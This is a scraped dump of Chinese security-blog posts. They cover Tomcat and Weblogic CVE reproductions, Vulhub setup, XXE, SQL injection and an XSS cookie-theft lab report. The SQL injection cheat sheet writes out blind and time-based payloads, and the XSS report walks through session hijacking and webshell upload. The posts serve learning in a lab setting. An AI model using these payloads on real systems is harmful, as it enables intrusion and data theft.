index是一个程序的入口文件，所以通常我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件又有哪些。 参考文献《代码审计》尹毅 著"},{"title":"Tomcat 远程代码执行_提权漏洞(CVE-2019-0232)复现","date":"2021-01-16T18:02:51.000Z","url":"/2021/01/16/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E(CVE-2019-0232)%E5%A4%8D%E7%8E%B0/","tags":[["Tomcat","/tags/Tomcat/"]],"categories":[["漏洞复现","/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"]],"content":"一.漏洞概述该漏洞存在于启用了enableCmdLineArguments选项的CGI Servlet中,与JRE向Windows传递参数过程中的bug有关。成功利用此漏洞可允许远程攻击者在目标服务器上执行任意命令,从而导致服务器被完全控制。由于Apache Tomcat应用范围广泛，该漏洞一旦被大规模利用，带来后果将不堪设想。 触发该漏洞需要同时满足以下条件： 系统为Windows 启用了CGI Servlet（默认为关闭） 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭） 二.影响版本 三.漏洞复现1.复现环境 2.修改web.xml找到tomcat\\conf\\web.xml文件 将cgi的注释删掉(默认被注释) enableCmdLineArguments可能需要手动增添(Apache Tomcat 7可能没有此项，需要手动添加)，启用后才会将Url中的参数传递到命令行。 executable也可能需要手动增添(Apache Tomcat 7可能没有此项，需要手动添加)，指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。 同时要注意将第一个红框处改为cgi-bin(或者后面创建文件夹时就创建默认名) 还是web.xml文件 将cgi的注释删除，否则访问cgi-bin会提示404 3.修改context.xml找到tomcat\\conf\\context.xml文件，在红箭头出添加privileged=&quot;true&quot;否则会没有权限 4.添加 .bat文件在tomcat\\webapps\\ROOT目录下新建一个cgi-bin(这里的文件夹名要练习上文的配置改动)文件夹，并在cgi-bin文件夹下创建一个test.bat 内容如下 5.利用木马直接访问.bat文件同时构建cmd 四.漏洞防御1.升级到官方最新版本 2.关闭enableCmdLineArguments服务 这里有一篇很好的博客论述了漏洞原理，推荐给大家"},{"title":"Tomcat 信息泄露漏洞(CVE-2017-12616)复现","date":"2021-01-13T23:21:35.000Z","url":"/2021/01/13/Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E(CVE-2017-12616)%E5%A4%8D%E7%8E%B0/","tags":[["Tomcat","/tags/Tomcat/"]],"categories":[["漏洞复现","/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"]],"content":"一.漏洞概述漏洞触发的先决条件是需要在conf/server.xml配置VirtualDirContex参数，默认情况下tomcat7并不会对该参数进行配置。VirtualDirContex主要使用场景是在IDE开发环境，生产环境tomcat官方不建议开启。 正常情况下一般不会配置该参数开启，因此该漏洞显得有点鸡肋。 知乎的一篇文章从底层对这个漏洞分析的很详细 二.影响版本 三.漏洞复现1.复现环境 2.创建examples与leaked文件夹 并在两个文件夹内分别保存木马这里注意我再目录examples文件夹下的test1.jsp为木马，test2.jsp中为&lt;%out.print(&quot;test2.jsp&quot;);%&gt;,而在leaked文件夹下的test1.jsp中为&lt;%out.print(&quot;test1.jsp&quot;);%&gt;，test2.jsp为木马 木马如下 3.修改server.xml文件 找到tomcat\\conf\\server.xml，手动添加 注意D:\\middleware\\test\\examples与D:\\middleware\\test\\leaked都是我的本地文件路径，要根据自己情况修改 这里添加语句的意思是，当别人访问/test路径时，会被映射到物理路径D:\\middleware\\test\\examples。当/examples路径里面没有你要访问的文件时，系统就会去D:\\middleware\\test\\leaked进行查找。 4.利用木马 访问/test/test1.jsp和/test/test2.jsp 这里看到访问test1.jsp木马成功执行，访问test2.jsp仅返回输出值，说明服务器是先访问examples文件夹，若文件夹不存在该文件才会去访问leaked文件夹 四.漏洞防御1.升级到官方的最新版本 2.在conf/server.xml关闭VirtualDirContex参数"},{"title":"Tomcat 远程代码执行漏洞(CVE-2017-12615)复现","date":"2021-01-13T01:50:01.000Z","url":"/2021/01/12/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-12615)%E5%A4%8D%E7%8E%B0/","tags":[["Tomcat","/tags/Tomcat/"]],"categories":[["漏洞复现","/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"]],"content":"一.漏洞概述当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。 二.影响版本 三.漏洞复现1.复现环境 tomcat环境搭建 2.修改web.xml文件找到tomcat\\conf\\web.xml，手动添加 也有可能在web.xml中存在readonly，不过默认为true，修改为false即可 如此操作的目的是为了允许使用PUT方法上传任意文件，但限制了jsp后缀，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。 不过对于不同平台有多种绕过方法 具体来说，主要有三种方法： 3.访问tomcat由于burpsuite与tomcat端口号冲突(8080)所以我将tomcat的端口号改为了8081 4.使用burpsuit抓包我们直接用PUT传递发现返回404，符合我们的理论猜想 然后我们使用之前提到的绕过方法，发送成功，同时要注意，在上传jsp文件的同时，要把我们的代码粘贴到下方，这一步相当于创建一个shell.jsp文件并且把内容写入并上传。 shell.jsp 我们在tomcat\\webapps\\ROOT中也能看见shell.jsp上传成功 6.利用上传木马直接访问shell.jsp文件。同时GET传递pwd(123),和cmd 复现成功 四.漏洞防御1、配置readonly值为True或注释参数，禁止使用PUT方法并重启tomcat。注意：如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。 2、根据官方补丁升级最新版本。"},{"title":"Weblogic 任意文件上传漏洞(CVE-2018-2894)复现","date":"2021-01-10T16:00:05.000Z","url":"/2021/01/10/Weblogic%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2018-2894)%E5%A4%8D%E7%8E%B0/","tags":[["Weblogic","/tags/Weblogic/"]],"categories":[["漏洞复现","/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"]],"content":"一.漏洞概述Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限 二.影响版本 三.漏洞复现靶场搭建详细教程1.首先搭建靶场 2.执行docker-compose logs | grep password可查看管理员密码 管理员用户名为weblogic，密码为nzIF2unH 注意:每个人的密码是不同的,都是随机组成的! 3.环境启动之后，访问，即可看到后台登录页面 4.登陆后选择 域结构→高级 5.给这一项打勾6.访问，设置Work Home Dir为 7.还是本页面,选择 安全→添加,上传一个 .jsp 木马,名字密码随便 这里给大家分享一下我的 .jsp木马,很多shell的访问都可以用到的 8.上传后查看前端上传文件的时间戳(id),并且记住它 9.访问[时间戳]_[文件名]，即可执行webshell 我的木马中pwd是固定的(123),cmd就是命令行操作了 四.漏洞防御1、 设置config.do,begin.do页面登录授权后访问； 2、 IPS等防御产品可以加入相应的特征； 3、 升级到官方的最新版本；"},{"title":"Vulhub渗透测试环境搭建","date":"2021-01-09T01:11:06.000Z","url":"/2021/01/08/Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","tags":[["配置","/tags/%E9%85%8D%E7%BD%AE/"]],"categories":[["环境配置","/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"]],"content":"一.说明Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身,Vulhub拥有大量靶场，包含了各种软件不同版本的漏洞，是学习漏洞复现的一个优质靶场 具体软件如下 二.安装Docker1.安装pip 2.安装最新版本的docker 3.运行docker服务 4.安装docker-compose 三.下载Vulhub1.下载vulhub-master.zip 2.解压vulhub-master.zip 如果没有wget可以直接访问并且下载解压 四.布置靶场环境这里以Weblogic 任意文件上传漏洞(CVE-2018-2894)为例 1.找到目标地址 2.命令行切换至该文件目录下 3.搭建docker环境 4.启动docker环境 这个命令执行后要等待一定时间 5.查看启动的docker 这里要注意端口号，这里是7001 6.访问docker 在任何一个浏览器(任何电脑也可以，docker相当于创建一个网站，谁都可以访问)访问网站http://[创建docker的IP号]:[端口号]即可(注意有冒号) 注意:CVE-2018-2894的docker访问后出现404是正常现象 五.切换靶场环境如果已经成功搭建好靶场后想要换一个靶场需要如下操作 这里以CVE-2018-2894切换为CVE-2018-2628为例 1.停止之前的docker 通过docker ps -a 可以看到这个docker的ID 输入 2.删除原靶场环境(可选) 可以通过输入 删除该靶场环境，当然如果以后想要继续使用可以保留不删除 3.搭建新的靶场 步骤同搭建靶场环境"},{"title":"XXE总结","date":"2020-12-27T01:01:55.000Z","url":"/2020/12/26/XXE%E6%80%BB%E7%BB%93/","tags":[["XXE","/tags/XXE/"]],"categories":[["Web","/categories/Web/"]],"content":"一、XXE 是什么XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是XML外部实体，如果能注入外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。 二、背景知识：XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。 在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。 其于HTML的区别是： HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 XML文档结构包括： XML声明 DTD文档类型定义（可选） 文档元素 三、基础知识1.典型的xml文档 2.DTD概念及声明、引用方式DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 DTD一般认为有两种引用或声明方式： 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。 DTD实体有以下几种声明方式 内部实体 内部参数实体 参数实体用% name申明，引用时用%name;，只能在DTD中申明，DTD中引用。 其余实体直接用name申明，引用时用&amp;name;，只能在DTD中申明，可在xml文档中引用 外部实体 外部参数实体 四、XXE的应用1.任意文件读取一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。 有回显恶意引入外部实体直接读靶机文件 恶意引入外部参数实体 无回显OOB先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。 PS:内部的%号要进行实体编码成&amp;#x25。 访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。 基于报错基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据,所以和OOB的构造方式几乎只有url出不同，其他地方相同。 通过引入服务器文件 通过引入本地文件如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一些实体内容就行。 第一个调用的参数实体是%remote，在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send 嵌套参数实体虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式 基于报错的三层嵌套参数实体XXE 2.内网探测和读文件差不多，只不过把URI改成内网机器地址 3.RCE这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令： 以下代码将尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启 响应： 4.DOS攻击 此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。如果目标是UNIX系统， 如果 XML 解析器尝试使用/dev/random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。 五、XXE绕过1.大小写绕过利用政策匹配不严格，大小写绕过 2.ENTITY、SYSTEM、file等关键词被过滤使用编码方式绕过：UTF-16BE 3.html实体编码绕过如果过滤了http等协议，可以利用实体编码绕过： 4.data://协议绕过 5.file://协议加文件上传 6.php://filter协议加文件上传 六、利用场景1.svg tips:从当前文件夹读取文件可以使用/proc/self/cwd 2.excel首先用excel创建一个空白的xlsx，然后解压 将[Content_Types].xml改成恶意xml，再压缩回去 七、CTF须知在ctf比赛中常访问的文件地址： flag在没有提示时通常在根目录下，通过file:///来读取，通常为flag、flag.txt、flah.php文件 参考： Blind XXE 详解 + Google CTF 一道题目分析 CTF XXE xxe笔记 一篇文章带你深入理解漏洞之 XXE 漏洞 XXE萌新进阶全攻略 XXE漏洞利用技巧：从XML到远程代码执行 绕过WAF保护的XXE 利用EXCEL进行XXE攻击"},{"title":"SQL注入漏洞底层原理解析(注入点原理)","date":"2020-12-10T21:06:06.000Z","url":"/2020/12/10/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90(%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8E%9F%E7%90%86)/","tags":[["sql注入","/tags/sql%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"sql注入是一种常见的漏洞，大部分人只知道sql注入漏洞是由于sql语句过滤不够严谨所导致的，但是为什么过滤不严谨就会造成sql注入，对于这个问题，我们今天就来深挖一下sql注入产生的根本原因—–深入研究注入点。我再本地创建了两个表(命名和数据没有任何含义纯属瞎编的)Mysql版本5.1.60第一个表：news，可以理解为存储新闻信息的表，是理论上允许客户访问使用的数据库，里面并不存储敏感信息。第二个表：ps，用于账号管理的表，里面有管理员账号，有敏感信息。 一、SELECT注入PS:在select中举例的数据库不是我本地所建的那两个，这个属于虚构，主要是提供一种思想SELECT语句用于数据表记录的查询，常在界面展示过程中使用，如新闻的内容、界面的展示等。 1.注入点在select_expr 可以采用时间盲注，更优解：AS别名方法 PS:如果注入点有反引号包裹，那么需要先闭合反引号。 2.注入点在table_referencee 可以用AS别名法 PS:如果注入点有反引号包裹，那么需要先闭合反引号。 3.注入点在WHERE或HAVING后 首先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。 HAVING与之相似 4.注入点在GROUP BY 或 ORDER BY 后 ?ititle=id desc,(if(1,sleep(5),1)) 可以让页面睡眠5秒，可以利用这一特点进行基于时间的注入。 ORDER BY与之相似 5.注入点在LIMIT后通过改变数字的大小，页面会显示更多或者更少的记录数。 在整个SQL语句没有ORDER BY 关键字的情况下，可以直接使用UMION注入。 通过加入PROCEDURE可以进行注入​ PS:只适用于Mysql5.1.5以后，Mysql5.6以前的版本 配合和报错注入： INTO OUTFILE写入web’shell在有写入权限的特定情况条件下，可以使用 INTO OUTFILE向web目录写入webshell 二、INSERT注入INSERT语句是插入数据记录的语句，常在添加新闻、用户注册、回复评论的地方出现。 1.注入点在tbl_name 开发者目的是控制news值为news，然后插入信息3，new2，new3 news中原有的内容 开发者理想情况： 然而我们可以构建paload在ps表中创建账号 2.注入点在VALUES 可以先闭合单引号，然后再插入一条记录，通过管理员和普通用户在同一个表，此时可以通过表字段来控制管理员权限。 在某些情况，我们也可以将数据插入能回显的字段 这里也可以执行select语句但是要注意不能在插入的表内查询此表不然会报错 INSERT INTO ps VALUES(7,’babababa’,’789’),(8,’afa’,(select password from ps limit 1,1)); 报错： 更改一下 可以看到 ps 表中的密码成功被写入news表中 三、UPDATE注入UPDATE语句适用于数据库的更新，如用户修改自己的文章、介绍信息、更新信息等。 假设我们可以操作的位置时id=多少 我们可以更改其列名，以方便我们利用， 思考一下我们输入id时不知道id对应的字段名是多少的，我们在改id的同时将某一列的字段更改，那么我们就可以根据我们更改的这个字段查询这一整条信息，或者借此更改管理员密码，实现管理员账号的登录。 四、DELETE注入DELETE语句的作用是删除某个表全部或指定行的数据。 DELETE注入多在WHERE之后，注入语句如下 为了防止在注入时删除数据，我们可以在后面加 and sleep(1) 让语句不报错却又无法正常执行 执行前： 执行中： 执行后： 再次基础上我们结合报错注入就可以实现语句的查询：详细的报错注入方法看这篇文章 例： 参考文献《从0到1》 NULL战队 著"},{"title":"sql注入小结","date":"2020-11-23T17:05:10.000Z","url":"/2020/11/23/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/","tags":[["sql注入","/tags/sql%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"数字型注入可以用 id=2 与 id=3-1 返回的页面是否相同来判断是否是数字型 联合注入 ↑直至返回报错，可以判断出列数↑ ↑哪个返回库名说明库在哪列↑ ↑爆出表名↑ ↑爆出字段名↑ ↑爆出值↑ 字符型注入字符串 ‘1’ 会被强制转成True 盲注布尔注入1.判断是否存在注入，注入是字符型还是数字型2.猜解当前数据库名id=1’ and length(database())=1/2/3…… #直到显示存在为止或者id=1’ and (length (database()))&gt;1/2/3……–+判断字符数是否小于1/2/3……个 3.猜解数据库中的表名首先猜解数据库中表的数量：输入1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1/2/3…… #直到显示存在为止。。。。接着挨个猜解表名：先求第n个表的表名长度：输入1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),n))=1/2/3…… # 直到有显示为止。。。。。。再猜第n个表的名字1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1/2/3……,n))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1/2/3……,n))&lt;122# 显示存在直到猜出来为止。。。。。最后猜出n个表的每一个表名 二分法输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；慢慢缩小范围直到试出来为止。。。。最后猜出第一个字符输入1’ and ascii(substr(databse(),2,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),2,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；同理猜第二个。。。。。。 4.猜解表中字段名首先猜解表中字段的数量：1’ and (select count(column_name) from information_schema.columns where table_name= ‘表名’)=1/2/3…… # 直到存在为止。。。接着挨个猜解字段名：先猜某个字段名的长度1’ and length(substr((select column_name from information_schema.columns where table_name= ‘表名’ limit 0,1),1))=1/2/3…… # 直到显示存在再猜第n个字段名：1’ and ascii(substr((select column_name from information_schema.columns WHERE table_schema=DATABASE() and table_name=’表名’ LIMIT 1),1/2/3……,1))=&gt;97 #1’ and ascii(substr((select column_name from information_schema.columns WHERE table_schema=DATABASE() and table_name=’表名’ LIMIT 1),1/2/3……,1))=&lt;122 #缩小范围确定字符 时间注入1.判断是否存在注入，注入是字符型还是数字型1’ and sleep(1/2/3……) # 2.猜解当前数据库名1’ and if(length(database())=1/2/3……,sleep(5),1)# 猜解数据名的长度1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 采用二分法猜解数据库名1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 采用二分法猜解数据库名 3.猜解数据库中的表名1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1/2/3……,sleep(5),1)# 猜解数据库中表的数量1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1/2/3……,sleep(5),1) # 猜解表名 4.猜解表中字段名1’ and if((select count(column_name) from information_schema.columns where table_name= ’表名’)=1/2/3……,sleep(5),1)# 猜解表中字段的数量 1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’表名’ limit 0,1),1))=1/2/3……,sleep(5),1) # 猜解字段名 堆叠注入mysql_multi_query() 支持多条sql语句同时执行 表名为数字要用反引号括起来"},{"title":"技术报告：XSS盗取Cookie","date":"2020-11-14T04:16:21.000Z","url":"/2020/11/13/%E6%8A%80%E6%9C%AF%E6%8A%A5%E5%91%8A%EF%BC%9AXSS%E7%9B%97%E5%8F%96Cookie/","tags":[["报告","/tags/%E6%8A%A5%E5%91%8A/"]],"categories":[["技术报告","/categories/%E6%8A%80%E6%9C%AF%E6%8A%A5%E5%91%8A/"]],"content":"第1章 绪 论1.1 XSS1.1.1 XSS的介绍XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 1.1.2 XSS的种类XSS常见的种类有三种：反射型：经过后端，不经过数据库。储存型：经过后端，经过数据库。DOM：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。 1.2 Cookie1.2.1 Cookie的介绍Cookie是在HTTP协议下，服务器与脚本可以维护客户工作站上信息的一种方式。Cookie是由Web服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。 1.2.2 Cookie的特性目前有些Cookie是临时的，有些则是持续的。临时的Cookie只在浏览器上保存一段规定的时间，一旦超过规定时间，该Cookie就会被系统清除。 1.2.3 Cookie的功用服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookie最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进行此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可以在一段时间内在同一家网站的不同网页中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。 第2章 相关技术与基础知识简介2.1 基本漏洞测试工具1.HTTP代理：是介于浏览器与服务器直接的中间桥梁，可以通过他来截取对应请求以及响应，同时可以查看对应数据包并进行修改。常用工具：Burpsuite2.网站爬虫：对测试的web app进行整个网站的爬取测试。常用工具：ZAP、Burpsuite、Httrack Python工具：Scrapy3.web漏洞扫描：针对web技术漏洞扫描。 常用工具：Appscan，AWVS Python工具：工具W3af4.目录探测：对web app不链接页面探测。 常用工具：Dirb，wfuzz 5.特定任务：需要自动化探测与利用的步骤很多，某些新技术没有探测工具可以用简单高效的编程来开发安全工具,开发以使用Python开 发安全工具为首选。 2.2 反射XSS盗取Cookie当发现存在反射型XSS漏洞的站点位置时，可以利用一下链接来盗取Cookie 将链接发送到用户，用户点击即可触发XSS漏洞。同时可以使用URL编码迷惑用户。Cookie.php代码： 将链接发送到用户，用户点击即可触发XSS漏洞。同时可以使用URL编码迷惑用户。Cookie.php代码： 例： 第3章 漏洞检测实时演示3.1 演示环境本次演示为Windows10电脑主机以及VM下Windows7虚拟机平台 图3-1主机IP 图3-2主机IP 图3-3虚拟机IP 3.2 演示步骤3.2.1构建盗取链接本次实验用DVWA作为被攻击对象，输入DVWA地址同时构建盗取链接 图3-4构建盗取链接 盗取成功后在本地下cookie.txt文件中发现一段内容，说明链接生效图3-5链接生效 也可以通过将payload直接进行传递，进行重定向图3-6重定向 图3-7成功取得cookie 3.2.2利用cookie会话劫持使用Burp Suit抓取网站，将cookie.php中的值复制替换到相应位置图3-8替换为cookie值 运行后，可以看见成功反弹登录界面图3-9成功反弹登录界面 3.2.3 上传一句话webshell会话劫持后进入被攻击主页，可以进行一些前端修改，也可以寻找一些上传漏洞进行进一步入侵 图3-10寻找上传点 创建一句话木马图3-11一句话木马 使用中国菜刀连接对应站点 图3-12连接站点 图3-13连接成功 3.2.4进一步信息读取用中国菜刀进行信息的深度挖取及敏感操作，如网站扫描，终端命令等 图3-14用户信息 图3-15 总 结首先我们要了解cookie的工作原理，通过它的短暂记忆性来获取尽可能多的数据。本次实验我并没用详细说明如何发现XSS漏洞，我们可以使用AWVS，AppScan，BurpSuite等工具来进行Wbe的漏洞扫描。除此之外我们还要清楚XSS不仅可以用于盗取cookie，还可以进行篡改网页链接，盗取用户信息等操作，也为我们今后学习XSS过滤培养了一种发散性的思维，从“敌人”的角度来思考问题来对抗敌人往往更加有效。此次XSS盗取cookie实验也告诉了我们一个web入侵的关键点，我们不应该放过任何一个切入点（漏洞），要充分发挥每一个漏洞的作用。比如本次实验，当我们成功盗取cookie后我们并没有止步于此，而且是进一步挖掘，通过盗取cookie获得的权限上传一句话木马一次来获得更高的权限。网络安全的学习是双向思维的，既有攻也有防，也许这正是网络安全的趣味所在，不可以只保持一个思路，只掌握一种技术，只有发散思维，全面学习，才能再一次一次的攻防战斗中感受网络安全的魅力。"},{"title":"python_re模块(python正则表达式)","date":"2020-10-29T15:31:55.000Z","url":"/2020/10/29/python_re%E6%A8%A1%E5%9D%97(python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F)/","tags":[["python","/tags/python/"]],"categories":[["编程","/categories/%E7%BC%96%E7%A8%8B/"]],"content":"python_re模块Python中re模块主要功能是通过正则表达式是用来匹配处理字符串的 import re 导入该模块后，就可以使用该模块下的所有方法和属性 @[toc] 元字符常用的元字符 代码 解释说明 . 匹配除换行符以外的任意字符 \\w 匹配字母或数字或下划线或汉字 \\s 匹配任意的空白符 \\d 匹配数字 \\b 匹配数字与非字母数字的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 | 匹配A或B r 转换为原生字符 \\w元字符\\w匹配包括下划线在内任何字母数字汉字字符 打印结果：[‘我’, ‘是’, ‘E’, ‘往’, ‘无’, ‘前’, ‘的’, ‘快’, ‘乐’, ‘风’, ‘男’, ‘‘, ‘‘, ‘h’, ‘a’, ‘s’, ‘a’, ‘i’] \\W匹配非任何字母数字汉字字符包括下划线在内 打印结果：[‘-‘, ‘ ‘, ‘-‘, ‘ ‘] \\s元字符\\s匹配任何空白字符，它相当于类[\\t\\n\\r\\f\\v] 打印结果：[‘\\n’, ‘ ‘, ‘\\t’, ‘ ‘, ‘ ‘, ‘\\x0c’, ‘ ‘, ‘\\x0b’, ‘ ‘, ‘ ‘] \\S匹配任何非空白字符，它相当于类[ ^\\t\\n\\r\\f\\v] 打印结果：[‘1’, ‘a’, ‘2’, ‘b’, ‘3’, ‘c’] \\w匹配包括下划线在内任何字母数字汉字字符 打印结果：[‘我’, ‘是’, ‘E’, ‘往’, ‘无’, ‘前’, ‘的’, ‘快’, ‘乐’, ‘风’, ‘男’, ‘‘, ‘‘, ‘h’, ‘a’, ‘s’, ‘a’, ‘i’] \\W匹配非任何字母数字汉字字符包括下划线在内 打印结果：[‘-‘, ‘ ‘, ‘-‘, ‘ ‘] \\d元字符\\d 匹配任何十进制数，它相当于类[0-9] 打印结果：[‘1’,’1’,’2’,’2’,’3’,’3’,’4’,’4’] \\d+如果需要匹配一位或者多位数的数字时用 打印结果：[‘11’,’22’,’33’,’44’] \\D匹配任何非数字字符，它相当于类 [ ^0-9] 打印结果：[‘aa’, ‘bb’, ‘cc’, ‘dd’] \\b元字符\\b元字符 表示字母数字与非字母数字的边界， 非字母数字与字母数字的边界 打印结果：[‘+=’, ‘! _abc’, ‘. ‘, ‘.123abc. ‘, ‘’] \\B元字符 表示字母数字与字母数字的边界，非字母数字与非字母数字的边界 打印结果：[‘+=123! _abc123. 123.’, ‘abc. 123’] ^元字符^元字符 以什么开头 打印内容：[‘面对疾风吧’] ^元字符 如果写到[]字符集里就是反取 打印内容：[‘无’, ‘反’, ‘顾’, ‘,’, ‘往’, ‘直’, ‘前’, ‘面’, ‘对’, ‘疾’, ‘风’, ‘吧’] $元字符$元字符 以什么结尾 打印内容：[‘吧’] |元字符|或，或就是前后其中一个符合就匹配 打印内容：[‘a’, ‘a’, ‘ddd’] 